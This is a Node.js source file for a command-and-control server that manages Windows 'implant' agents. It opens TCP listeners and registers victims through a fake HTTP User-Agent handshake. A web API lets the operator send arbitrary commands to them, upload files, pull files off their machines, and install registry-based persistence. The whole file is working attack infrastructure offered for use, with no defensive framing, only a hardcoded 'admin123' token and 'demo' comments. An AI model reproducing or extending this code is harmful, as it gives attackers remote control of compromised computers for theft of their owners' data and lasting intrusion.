const express = require('express');
const http = require('http');
const net = require('net');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { Server } = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');

// Ensure downloads directory exists
const DOWNLOAD_DIR = path.join(__dirname, 'downloads');
if (!fs.existsSync(DOWNLOAD_DIR)) {
    fs.mkdirSync(DOWNLOAD_DIR);
}

// Configuration
const WEB_PORT = 3000;
const AUTH_TOKEN = "admin123"; // Hardcoded token for demo

// Database Setup
const db = new sqlite3.Database(':memory:'); // Using in-memory DB for demo
db.serialize(() => {
    db.run("CREATE TABLE agents (id TEXT PRIMARY KEY, ip TEXT, identity TEXT, privilege TEXT, status TEXT, last_seen DATETIME)");
    db.run("CREATE TABLE logs (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, type TEXT, message TEXT, timestamp DATETIME)");
});

// Express & Socket.io Setup
const app = express();
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" }
});

// Authentication Middleware
const authMiddleware = (req, res, next) => {
    const token = req.headers['authorization'];
    if (token === AUTH_TOKEN) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
};

// Socket.io Authentication
io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    if (token === AUTH_TOKEN) {
        next();
    } else {
        next(new Error("Unauthorized"));
    }
});

const { TextDecoder } = require('util');

// Active TCP Clients Map
const tcpClients = new Map(); // identity -> socket
// Active Listeners Map
const activeListeners = new Map(); // id -> { server, port, host }

// ---------------------------------------------------------
// 1. TCP C2 Server Logic (Shared Handler)
// ---------------------------------------------------------
const handleTcpConnection = (socket) => {
    let identity = 'Unknown';
    let buffer = '';

    // File Download State
    let isDownloading = false;
    let downloadFileName = '';
    let downloadFileStream = null;

    // Upload State
    socket.uploadQueue = [];
    socket.initiateUpload = (filename, base64Content) => {
        socket.uploadQueue = [];
        const chunkSize = 1024;
        for (let i = 0; i < base64Content.length; i += chunkSize) {
            const chunk = base64Content.substring(i, i + chunkSize);
            socket.uploadQueue.push(`upload_data:${chunk}\n`);
        }
        socket.write(`upload_start:${filename}\n`);
        log(identity, 'upload', `Starting upload of ${filename}`);
    };

    console.log(`[TCP] New connection from ${socket.remoteAddress}`);

    socket.on('data', (data) => {
        // Try to decode as GBK (common for Chinese Windows CMD)
        // If it fails or looks weird, we might fallback, but usually TextDecoder handles it.
        // Note: Node.js TextDecoder supports 'gbk' if full ICU is present or via polyfills.
        // Standard Node.js usually supports 'gbk'.
        let text;
        try {
            const decoder = new TextDecoder('gbk');
            text = decoder.decode(data, { stream: true });
        } catch (e) {
            text = data.toString(); // Fallback to UTF-8
        }

        // Handle Upload Handshake
        if (text.includes('upload_ready')) {
            if (socket.uploadQueue && socket.uploadQueue.length > 0) {
                const sendChunks = () => {
                    if (socket.uploadQueue && socket.uploadQueue.length > 0) {
                        const chunk = socket.uploadQueue.shift();
                        socket.write(chunk);
                        setTimeout(sendChunks, 50);
                    } else {
                        socket.write('upload_end\n');
                    }
                };
                sendChunks();
            }
        } else if (text.includes('upload_complete')) {
            log(identity, 'upload', 'Upload completed successfully.');
        } else if (text.includes('upload_error')) {
            log(identity, 'error', `Upload failed: ${text.trim()}`);
        }

        // Handle File Download Stream
        if (text.includes('file_start:')) {
            const lines = text.split('\n');
            for (const line of lines) {
                if (line.startsWith('file_start:')) {
                    // Fix for Windows paths containing ':' (e.g. C:\...)
                    // Format: file_start:FILENAME:SIZE
                    const firstColon = line.indexOf(':');
                    const lastColon = line.lastIndexOf(':');

                    let rawFilename = "";
                    if (lastColon > firstColon) {
                        rawFilename = line.substring(firstColon + 1, lastColon);
                    } else {
                        rawFilename = line.substring(firstColon + 1);
                    }

                    const safeFilename = path.basename(rawFilename.replace(/\\/g, '/'));
                    downloadFileName = safeFilename;
                    isDownloading = true;

                    // User requested original filename only (no timestamp/identity prefix)
                    const filePath = path.join(DOWNLOAD_DIR, safeFilename);
                    downloadFileStream = fs.createWriteStream(filePath);

                    log(identity, 'download', `Started downloading: ${safeFilename}`);
                } else if (line.startsWith('file_data:') && isDownloading && downloadFileStream) {
                    const b64Data = line.substring(10);
                    const fileBuf = Buffer.from(b64Data, 'base64');
                    downloadFileStream.write(fileBuf);
                } else if (line.startsWith('file_end') && isDownloading) {
                    if (downloadFileStream) {
                        downloadFileStream.end();
                        downloadFileStream = null;
                    }
                    isDownloading = false;
                    log(identity, 'download', `Finished downloading: ${downloadFileName}`);
                } else if (isDownloading && downloadFileStream && line.trim() !== '') {
                    // Handle fragmented base64 data if necessary, but our C code sends line by line.
                    // If a line doesn't start with file_data but we are downloading, it might be a split packet.
                    // For simplicity, we assume C sends clean lines.
                } else {
                    // Normal buffer handling for handshake/commands
                    if (!isDownloading) buffer += line + '\n';
                }
            }
            return; // Skip normal processing if we handled file data
        }

        // If we are in the middle of a download and receive data without markers (fragmentation)
        if (isDownloading) {
            const lines = text.split('\n');
            for (const line of lines) {
                if (line.startsWith('file_data:') && downloadFileStream) {
                    const b64Data = line.substring(10);
                    const fileBuf = Buffer.from(b64Data, 'base64');
                    downloadFileStream.write(fileBuf);
                } else if (line.startsWith('file_end')) {
                    if (downloadFileStream) {
                        downloadFileStream.end();
                        downloadFileStream = null;
                    }
                    isDownloading = false;
                    log(identity, 'download', `Finished downloading: ${downloadFileName}`);
                }
            }
            return;
        }

        buffer += text;

        // Check for Fake HTTP Header (Handshake)
        if (identity === 'Unknown' && buffer.includes('\r\n\r\n')) {
            const headers = buffer.split('\r\n');
            const uaLine = headers.find(h => h.startsWith('User-Agent: '));
            let privilege = 'User';

            if (uaLine) {
                const parts = uaLine.split('User-Agent: ')[1].trim().split('|');
                // Format: Username(IP)
                let cleanIp = socket.remoteAddress.replace('::ffff:', '');
                let baseIdentity = `${parts[0]}(${cleanIp})`;

                // Handle duplicates: if identity exists, append suffix
                identity = baseIdentity;
                let dupCount = 1;
                while (tcpClients.has(identity)) {
                    identity = `${baseIdentity}_${dupCount}`;
                    dupCount++;
                }

                if (parts.length > 1) privilege = parts[1];
            } else {
                let cleanIp = socket.remoteAddress.replace('::ffff:', '');
                let baseIdentity = `Agent-${Math.floor(Math.random() * 1000)}(${cleanIp})`;

                identity = baseIdentity;
                let dupCount = 1;
                while (tcpClients.has(identity)) {
                    identity = `${baseIdentity}_${dupCount}`;
                    dupCount++;
                }
            }

            // Register Agent
            tcpClients.set(identity, socket);
            updateAgentStatus(identity, socket.remoteAddress, privilege, 'online');
            log(identity, 'connection', `Agent connected as ${identity} (${privilege})`);

            // Clear buffer after handshake
            buffer = '';
        }
        // Handle Command Output
        else if (identity !== 'Unknown') {
            log(identity, 'output', text);
        }
    });

    socket.on('end', () => {
        handleDisconnect(identity);
    });

    socket.on('error', (err) => {
        console.error(`[TCP] Error with ${identity}:`, err.message);
        handleDisconnect(identity);
    });
};

function handleDisconnect(identity) {
    if (identity !== 'Unknown') {
        tcpClients.delete(identity);
        updateAgentStatus(identity, null, 'Unknown', 'offline');
        log(identity, 'connection', 'Agent disconnected');
    }
}

function updateAgentStatus(id, ip, privilege, status) {
    const now = new Date().toISOString();
    // If privilege is 'Unknown', we try to keep the old one if possible, but for simplicity in this REPLACE query we might overwrite.
    // Better to use UPDATE if exists, but REPLACE is easier. 
    // To avoid losing privilege on disconnect (where we pass Unknown), we can check status.

    if (status === 'offline') {
        // Remove agent from DB so it disappears from UI immediately
        db.run(`DELETE FROM agents WHERE id = ?`, [id], () => io.emit('agents_update'));
    } else {
        db.run(`INSERT OR REPLACE INTO agents (id, ip, identity, privilege, status, last_seen) VALUES (?, ?, ?, ?, ?, ?)`,
            [id, ip || 'Unknown', id, privilege, status, now],
            () => {
                io.emit('agents_update'); // Notify Frontend
            }
        );
    }
}

function log(agentId, type, message) {
    const now = new Date().toISOString();
    db.run(`INSERT INTO logs (agent_id, type, message, timestamp) VALUES (?, ?, ?, ?)`,
        [agentId, type, message, now],
        function () {
            io.emit('log_new', { id: this.lastID, agent_id: agentId, type, message, timestamp: now });
        }
    );
}

// ---------------------------------------------------------
// 2. Web API & WebSocket (Handles React Frontend)
// ---------------------------------------------------------

// Login Check Endpoint
app.post('/api/login', authMiddleware, (req, res) => {
    res.json({ status: 'authenticated' });
});

// Get Network Interfaces
app.get('/api/interfaces', authMiddleware, (req, res) => {
    const interfaces = os.networkInterfaces();
    const addresses = [];
    Object.keys(interfaces).forEach(iface => {
        interfaces[iface].forEach(details => {
            if (details.family === 'IPv4') {
                addresses.push({ name: iface, address: details.address });
            }
        });
    });
    addresses.push({ name: 'Any', address: '0.0.0.0' });
    res.json(addresses);
});

// Listener Management
app.get('/api/listeners', authMiddleware, (req, res) => {
    const list = [];
    activeListeners.forEach((val, key) => {
        list.push({ id: key, port: val.port, host: val.host });
    });
    res.json(list);
});

app.post('/api/listeners', authMiddleware, (req, res) => {
    const { port, host } = req.body;
    const id = `${host}:${port}`;

    if (activeListeners.has(id)) {
        return res.status(400).json({ error: 'Listener already exists' });
    }

    try {
        const server = net.createServer(handleTcpConnection);
        server.listen(port, host, () => {
            console.log(`[C2] Started listener on ${host}:${port}`);
        });

        server.on('error', (err) => {
            console.error(`[C2] Listener error on ${host}:${port}:`, err.message);
        });

        activeListeners.set(id, { server, port, host });
        res.json({ status: 'started', id, port, host });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/listeners/:id', authMiddleware, (req, res) => {
    const { id } = req.params;
    // Need to decode because ID contains ':'
    const decodedId = decodeURIComponent(id);

    if (activeListeners.has(decodedId)) {
        const { server } = activeListeners.get(decodedId);
        server.close();
        activeListeners.delete(decodedId);
        console.log(`[C2] Stopped listener on ${decodedId}`);
        res.json({ status: 'stopped' });
    } else {
        res.status(404).json({ error: 'Listener not found' });
    }
});

// Get All Agents
app.get('/api/agents', authMiddleware, (req, res) => {
    db.all("SELECT * FROM agents", (err, rows) => {
        res.json(rows);
    });
});

// Get Logs
app.get('/api/logs', authMiddleware, (req, res) => {
    db.all("SELECT * FROM logs ORDER BY timestamp ASC LIMIT 100", (err, rows) => {
        res.json(rows);
    });
});

// Send Command
app.post('/api/command', authMiddleware, (req, res) => {
    const { agentId, command } = req.body;
    const socket = tcpClients.get(agentId);

    if (socket) {
        socket.write(command + "\n"); // Send to C Implant
        log(agentId, 'command', `Sent: ${command}`);

        // If command is terminate or disconnect, we might want to close socket from server side too eventually,
        // but let the agent close it first.

        res.json({ status: 'sent' });
    } else {
        res.status(404).json({ error: 'Agent not connected' });
    }
});

// Terminate/Disconnect Agent
app.post('/api/agent/:id/action', authMiddleware, (req, res) => {
    const { id } = req.params;
    const { action } = req.body; // 'disconnect' or 'terminate'
    const socket = tcpClients.get(id);

    if (!socket) return res.status(404).json({ error: 'Agent not connected' });

    if (action === 'disconnect') {
        socket.write("disconnect\n");
        log(id, 'command', 'Sent: disconnect');
        // socket.end(); // Let agent close it
    } else if (action === 'terminate') {
        socket.write("terminate\n");
        log(id, 'command', 'Sent: terminate');
    } else {
        return res.status(400).json({ error: 'Invalid action' });
    }
    res.json({ status: 'sent' });
});

// Persistence Command
app.post('/api/agent/:id/persist', authMiddleware, (req, res) => {
    const { id } = req.params;
    const { method } = req.body; // 'hkcu', 'hklm', 'schtask'
    const socket = tcpClients.get(id);

    if (!socket) return res.status(404).json({ error: 'Agent not connected' });

    if (method === 'hkcu') {
        socket.write("persist:hkcu\n");
    } else if (method === 'hklm') {
        socket.write("persist:hklm\n");
    } else if (method === 'clean:hkcu') {
        socket.write("clean:hkcu\n");
    } else if (method === 'clean:hklm') {
        socket.write("clean:hklm\n");
    } else if (method === 'schtask') {
        // For schtask, we use the standard command execution
        // schtasks /create /tn "NextGenC2" /tr "path_to_exe" /sc onlogon /f
        // We need the agent to know its own path. The agent doesn't send it back easily unless we ask.
        // But wait, the C code for 'persist:hkcu' gets its own path.
        // We can implement 'persist:schtask' in C code too, or just send the raw command if we knew the path.
        // Since we don't know the path on server, let's implement 'persist:schtask' in C code?
        // Or just rely on the C code handling 'persist:hkcu' and 'persist:hklm' for now as requested.
        // The user asked for "different persistence options".
        // Let's stick to the ones we implemented in C: hkcu, hklm.
        // If user wants schtask, we can add it to C later or now.
        // Let's assume we only support hkcu/hklm for now as per C code changes.
        return res.status(400).json({ error: 'Method not supported yet' });
    }

    log(id, 'command', `Sent persistence: ${method}`);
    res.json({ status: 'sent' });
});

io.on('connection', (socket) => {
    console.log('[Web] Frontend connected');
});

// ---------------------------------------------------------
// File Upload API
// ---------------------------------------------------------
app.post('/api/upload', authMiddleware, (req, res) => {
    const { agentId, filename, content } = req.body; // content is base64
    const socket = tcpClients.get(agentId);

    if (!socket) return res.status(404).json({ error: 'Agent not connected' });
    if (!filename || !content) return res.status(400).json({ error: 'Missing filename or content' });

    if (socket.initiateUpload) {
        socket.initiateUpload(filename, content);
        res.json({ status: 'started' });
    } else {
        res.status(500).json({ error: 'Upload not supported on this socket' });
    }
});

server.listen(WEB_PORT, () => {
    console.log(`[Web] API & Socket.io listening on port ${WEB_PORT}`);
});
